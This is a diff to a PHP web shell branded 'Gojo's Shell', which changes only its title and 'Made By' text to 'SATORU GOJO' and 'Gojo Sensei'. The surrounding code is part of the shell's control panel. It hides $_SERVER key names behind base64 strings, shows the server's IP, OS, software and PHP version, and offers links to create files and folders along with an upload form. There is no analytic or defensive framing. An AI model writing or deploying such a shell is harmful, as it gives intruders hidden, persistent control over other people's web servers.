@@ -168,11 +168,11 @@ function tF($yf)
 <html lang="en">
 <head>
 <meta property="og:image" content="https://raw.githubusercontent.com/kinglodon/kinglodon/main/faviconnn.png" />
-<meta property="og:title" content="Gojo's Shell ✌" />
+<meta property="og:title" content="✌" />
 <meta property="og:description" content="" />
 <meta name="theme-color" content="red">
 <meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
-<title>Gojo's Shell ✌</title>
+<title>✌</title>
 <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <link rel="icon" href="https://raw.githubusercontent.com/kinglodon/kinglodon/main/faviconnn.png">
@@ -390,14 +390,14 @@ button, input:hover {
 <body>
 <div class="table-responsive text-light" style="text-align: left;padding: 4px;border: 2px solid red;border-radius:5px;">
     <div style="text-align: center;display: flex;align-items: center;justify-content: center;align-content: center;">
-        <a href="?" style="font-size: 2rem;font-family: Merienda;padding-left: 0.3rem;padding-right: 0.3rem;"><span class="kedip">Gojo's Shell ✌</span></a>
+        <a href="?" style="font-size: 2rem;font-family: Merienda;padding-left: 0.3rem;padding-right: 0.3rem;"><span class="kedip">👑SATORU GOJO 👑</span></a>
     </div>
         <li>Your IP : <span style="color: red;"><?php echo $_SERVER[base64_decode('UkVNT1RFX0FERFI=')]; ?></span></li>
         <li>Server IP : <span style="color: red;"><?php echo $_SERVER[base64_decode('U0VSVkVSX05BTUU=')]; ?></span></li>
         <li>Server : <span style="color: red;"><?php echo php_uname(); ?></span></li>
         <li>Server Software : <span style="color: red;"><?php echo $_SERVER[base64_decode('U0VSVkVSX1NPRlRXQVJF')]; ?></span></li>
         <li>PHP Version : <span style="color: red;"><?php echo phpversion(); ?></span></li>
-        <li>Made By : <span class="kedip">Gojo's Senpai</span></li>
+        <li>Made By : <span class="kedip">Gojo Sensei</span></li>
         <li><a href="?p=<?= ss($Jd) . base64_decode('JmE9') . Ss(base64_decode('bmV3RmlsZQ==')) ?>" class="ohct">+ File</a> | <a href="?p=<?= Ss($Jd) . base64_decode('JmE9') . sS(base64_decode('bmV3RGly')) ?>" class="ohct">+ Folder</a></li>
         <li>
             <form method="post" enctype="multipart/form-data" style="padding: 0.10rem;display: inline-block;">
